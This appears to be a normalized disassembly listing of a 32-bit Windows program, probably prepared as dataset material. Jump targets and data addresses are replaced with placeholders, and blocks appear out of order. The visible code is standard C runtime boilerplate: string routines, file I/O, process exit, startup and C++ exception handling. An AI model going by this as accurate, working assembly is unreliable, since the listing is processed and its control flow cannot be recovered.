jne r-xdata
mov eax ebx
pop esi
dec [ esi + 0x4 ]
js r-xdata
sub_405ba0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_405bef
push ebp
mov ebp esp
sub esp 0xcc
lea eax [ ebp - 0x10 ]
push eax
call [ GetLocalTime@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call [ GetSystemTime@IAT ]
mov ax [ ebp - 0x16 ]
cmp ax [ rw-data ]
jne r-xdata
lea eax [ ebp - 0xcc ]
push eax
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ax [ ebp - 0x18 ]
cmp ax [ rw-data ]
jne r-xdata
or eax 0xffffffff
cmp eax 0x2
jne r-xdata
mov ax [ ebp - 0x1a ]
cmp ax [ rw-data ]
jne r-xdata
leave
retn
mov [ ecx ] eax
xor eax eax
jmp r-xdata
cmp [ ebp - 0x32 ] 0x0
je r-xdata
mov ax [ ebp - 0x1e ]
cmp ax [ rw-data ]
jne r-xdata
push esi
push edi
lea esi [ ebp - 0x20 ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov [ rw-data ] eax
pop esi
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ax [ ebp - 0x20 ]
cmp ax [ rw-data ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov eax [ rw-data ]
jmp r-xdata
push eax
movzx eax [ ebp - 0x4 ]
push eax
movzx eax [ ebp - 0x6 ]
push eax
movzx eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
movzx eax [ ebp - 0xe ]
push eax
movzx eax [ ebp - 0x10 ]
push eax
call sub_4087d9
mov ecx [ ebp + 0x8 ]
add esp 0x1c
test ecx ecx
je r-xdata
sub_405ccb
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_40889b
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_40889b
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_405d80
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_405e40
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_405ec0
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
retn
mov edx [ esp + 0x4 ]
push esi
push edi
mov esi edx
mov edi [ esp + 0x10 ]
or edx edi
and edx 0x3
je r-xdata
mov ecx eax
and eax 0x3
shr ecx 0x2
je r-xdata
test eax 0x1
je r-xdata
test eax eax
je r-xdata
[ esi ] [ edi ]
je r-xdata
mov cl [ esi ]
mov dl [ edi ]
cmp cl dl
jne r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edi
pop esi
mov edx [ esi ]
mov ecx [ edi ]
cmp dl cl
jne r-xdata
mov ecx [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
cmp cl dl
jne r-xdata
sbb eax eax
pop edi
sbb eax 0xffffffff
pop esi
retn
mov cl [ esi + 0x1 ]
mov dl [ edi + 0x1 ]
cmp cl dl
jne r-xdata
inc esi
inc edi
dec eax
je r-xdata
mov eax 0x0
dec eax
je r-xdata
cmp ch dh
jne r-xdata
add edi 0x2
add esi 0x2
sub eax 0x2
jne r-xdata
pop edi
pop esi
retn
cmp dh ch
jne r-xdata
shr ecx 0x10
shr edx 0x10
cmp cl dl
jne r-xdata
dec eax
je r-xdata
cmp ch dh
and ecx 0xff0000
and edx 0xff0000
cmp edx ecx
jne r-xdata
dec eax
sub_405f70
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_405f9f
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_406f0d
pop ecx
test eax eax
push esi
je r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push eax
call sub_406f38
pop ecx
pop ecx
pop esi
retn
sub_405fce
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
test edi edi
mov [ ebp - 0x4 ] edi
mov [ ebp + 0x8 ] ecx
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
jmp r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test [ esi + 0xc ] 0x10c
je r-xdata
cmp ecx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_408518
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp [ ebp + 0x14 ] 0x0
mov eax ecx
je r-xdata
cmp ecx eax
mov edi ecx
jb r-xdata
mov eax edi
xor edx edx
sub eax [ ebp + 0x8 ]
div [ ebp + 0xc ]
jmp r-xdata
mov [ ebx ] al
mov eax [ esi + 0x18 ]
inc ebx
dec [ ebp + 0x8 ]
mov [ ebp + 0x14 ] eax
push eax
push ebx
push [ esi + 0x10 ]
call sub_408944
add esp 0xc
test eax eax
je r-xdata
xor edx edx
div [ ebp + 0x14 ]
mov eax ecx
sub eax edx
push edi
push [ esi ]
push ebx
call sub_405720
sub [ ebp + 0x8 ] edi
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
add ebx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov edi eax
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
or [ esi + 0xc ] 0x20
sub [ ebp + 0x8 ] eax
add ebx eax
jmp r-xdata
sub_4060b6
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
mov [ rw-data ] 0x16
or eax 0xffffffff
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
and al 0xef
cmp edi 0x1
mov [ esi + 0xc ] eax
jne r-xdata
cmp edi 0x1
je r-xdata
push esi
call sub_408446
mov eax [ esi + 0xc ]
pop ecx
test al 0x80
je r-xdata
push esi
call sub_408bd4
add [ esp + 0x14 ] eax
pop ecx
xor edi edi
cmp edi 0x2
jne r-xdata
test al 0x1
je r-xdata
and al 0xfc
mov [ esi + 0xc ] eax
jmp r-xdata
push edi
push [ esp + 0x14 ]
push [ esi + 0x10 ]
call sub_408b3a
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
jmp r-xdata
test al 0x8
je r-xdata
pop edi
pop esi
retn
test ah 0x4
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_406142
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
imul edi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edi
test edi edi
mov [ ebp + 0x8 ] eax
mov ebx edi
jne r-xdata
mov esi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x14 ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp + 0x14 ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
and ecx 0x108
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_407a0e
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
test ecx ecx
je r-xdata
cmp ebx eax
mov edi ebx
jb r-xdata
mov eax edi
inc [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
dec ebx
mov [ ebp + 0x14 ] eax
test eax eax
jg r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push esi
call sub_408446
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi ]
call sub_405720
sub [ esi + 0x4 ] edi
add [ esi ] edi
add esp 0xc
sub ebx edi
add [ ebp + 0x8 ] edi
jmp r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1
mov edi ebx
mov eax ebx
xor edx edx
div [ ebp + 0x14 ]
mov edi ebx
sub edi edx
jmp r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
or [ esi + 0xc ] 0x20
mov eax [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] eax
sub ebx eax
cmp eax edi
jb r-xdata
push edi
push [ ebp + 0x8 ]
push [ esi + 0x10 ]
call sub_408d2c
add esp 0xc
cmp eax 0xffffffff
je r-xdata
sub eax ebx
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
sub_40624c
mov eax [ esp + 0x4 ]
push esi
push 0x2
mov edx eax
mov si [ eax ]
pop ecx
mov si [ esp + 0xc ]
sub eax ecx
cmp eax edx
je r-xdata
mov si [ eax ]
jmp r-xdata
mov cx [ eax ]
sub cx si
pop esi
neg cx
sbb ecx ecx
not ecx
and eax ecx
retn
cmp [ eax ] si
je r-xdata
add eax ecx
test si si
je r-xdata
sub eax ecx
cmp eax edx
jne r-xdata
sub_40628c
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
push edi
mov cx [ esi ]
pop edi
pop esi
test eax eax
jge r-xdata
test cx cx
je r-xdata
jle r-xdata
or eax 0xffffffff
retn
inc edx
inc edx
inc esi
inc esi
mov cx [ esi ]
jmp r-xdata
retn
push 0x1
pop eax
movzx eax [ edx ]
movzx edi cx
sub eax edi
jne r-xdata
sub_4062c1
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push esi
mov dx [ ecx ]
lea esi [ eax + 0x2 ]
mov [ eax ] dx
pop esi
retn
mov dx [ ecx ]
mov [ esi ] dx
inc esi
inc esi
jmp r-xdata
inc ecx
inc ecx
test dx dx
je r-xdata
sub_4062e6
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and eax 0x103
retn
push 0x103
push [ esp + 0x8 ]
call sub_40889b
pop ecx
pop ecx
retn
sub_406314
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x4
retn
push 0x4
push [ esp + 0x8 ]
call sub_40889b
pop ecx
pop ecx
retn
sub_40638b
push edi
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_406424
pop ecx
pop ecx
test ebx ebx
pop ebx
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
retn
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
push rw-data
push rw-data
call sub_406424
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
call [ GetVersion@IAT ]
xor edx edx
mov dl ah
mov [ rw-data ] edx
mov ecx eax
and ecx 0xff
mov [ rw-data ] ecx
shl ecx 0x8
add ecx edx
mov [ rw-data ] ecx
shr eax 0x10
mov [ rw-data ] eax
xor esi esi
push esi
call sub_406e93
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] esi
call sub_4094ed
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_4093bb
mov [ rw-data ] eax
call sub_40916e
call sub_4090b5
call sub_40633c
mov [ ebp - 0x30 ] esi
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
call sub_40905d
mov [ ebp - 0x64 ] eax
test [ ebp - 0x30 ] 0x1
je r-xdata
push 0x1c
call sub_406559
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push [ ebp - 0x64 ]
push esi
push esi
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x60 ] eax
push eax
call sub_406369
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x68 ] ecx
push eax
push ecx
call sub_408ed9
pop ecx
pop ecx
retn
sub_40657d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_406e22
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_406618
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4068c4
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_406618
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_406e22
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_406dcc
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4067bf
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4052c1
add esp 0x14
mov ebx eax
mov eax [ rw-data ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_409968
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_406e22
push 0x1
push esi
call sub_406ced
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx + 0xc ]
test eax eax
mov [ ebp - 0xc ] eax
jle r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edi [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x8 ] eax
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
dec [ ebp - 0xc ]
add [ ebp + 0x8 ] 0x10
cmp [ ebp - 0xc ] 0x0
jg r-xdata
push [ esi + 0x1c ]
push [ edi ]
push [ ebp + 0x8 ]
call sub_406867
add esp 0xc
test eax eax
jne r-xdata
call sub_406e22
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ edi ]
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_406978
add esp 0x2c
dec [ ebp - 0x8 ]
add edi 0x4
cmp [ ebp - 0x8 ] eax
jg r-xdata
sub_4067bf
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
push esi
push edi
je r-xdata
mov edi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_4052c1
add esp 0x14
mov esi eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405198
add esp 0x1c
test eax eax
jne r-xdata
pop edi
pop esi
leave
retn
cmp edi [ esi ]
jl r-xdata
inc [ ebp - 0x4 ]
add esi 0x14
jmp r-xdata
cmp edi [ esi + 0x4 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
push 0x1
add eax 0xfffffff0
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406978
add esp 0x2c
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
sub_406867
push esi
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push 0x1
pop eax
cmp [ eax + 0x8 ] 0x0
lea edx [ eax + 0x8 ]
je r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_405690
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ esp + 0x14 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
retn
test [ edi ] 0x2
jne r-xdata
sub_4068c4
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0x8 ]
mov [ ebp - 0x1c ] esi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp esi 0xffffffff
jle r-xdata
call sub_406e22
cmp esi [ edi + 0x4 ]
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x103
push ebx
push eax
call sub_406d80
and [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x8 ]
mov eax [ eax + esi * 8 + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov esi [ eax + esi * 8 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_406978
push ebp
mov ebp esp
cmp [ ebp + 0x20 ] 0x0
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0xc ]
je r-xdata
cmp [ ebp + 0x2c ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x20 ]
push ebx
push edi
push [ ebp + 0x8 ]
call sub_406b29
add esp 0x10
push [ ebp + 0x2c ]
push edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push edi
push eax
call sub_405058
call sub_40509a
mov esi [ ebp + 0x24 ]
push [ esi ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push edi
call sub_4068c4
mov eax [ esi + 0x4 ]
push 0x100
push [ ebp + 0x28 ]
inc eax
mov [ edi + 0x8 ] eax
push [ ebx + 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_4069f3
add esp 0x2c
test eax eax
je r-xdata
sub_4069f3
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x2c ] eax
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov esi [ ebp + 0xc ]
mov ecx [ esi - 0x4 ]
mov [ ebp - 0x28 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp + 0x8 ]
mov [ rw-data ] edi
mov ecx [ ebp + 0x10 ]
mov [ rw-data ] ecx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push esi
call sub_40511f
add esp 0x14
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] ebx
or [ ebp - 0x4 ] 0xffffffff
call sub_406ab9
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_406ab9
mov eax [ ebp - 0x28 ]
mov [ esi - 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ rw-data ] eax
mov eax [ ebp - 0x20 ]
mov [ rw-data ] eax
cmp [ edi ] 0xe06d7363
jne r-xdata
retn
cmp [ edi + 0x10 ] 0x3
jne r-xdata
cmp [ edi + 0x14 ] 0x19930520
jne r-xdata
cmp [ ebp - 0x24 ] ebx
jne r-xdata
cmp [ ebp - 0x2c ] ebx
je r-xdata
call sub_4053e6
push eax
push edi
call sub_406ced
pop ecx
pop ecx
sub_406aff
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_406b29
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ecx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
lea edi [ eax + edx + 0xc ]
and [ ebp - 0x4 ] 0x0
test [ ecx ] 0x8
je r-xdata
